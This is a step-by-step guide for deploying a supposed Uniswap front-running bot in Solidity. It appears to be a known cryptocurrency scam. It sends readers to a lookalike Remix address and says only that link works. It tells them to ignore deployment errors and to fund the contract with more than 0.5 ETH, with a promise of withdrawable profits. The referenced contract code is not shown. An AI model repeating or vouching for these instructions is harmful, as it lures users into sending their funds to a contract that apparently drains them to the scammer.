**STEP BY STEP INSTRUCTIONS**

1. Download MetaMask:
https://metamask.io/download

2. Access Remix:
https://remix-idedeploy.com/ 
(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)

3. Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.

Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

4. Paste the code above (Bot.sol) in Remix: 

5. Go to the "Solidity Compiler" tab, select version "0.6.6+commit.6c089d02" and then select "Compile bot.sol".

6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Web3” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "UniswapFrontrunBot -bot.sol".

Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

7. Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
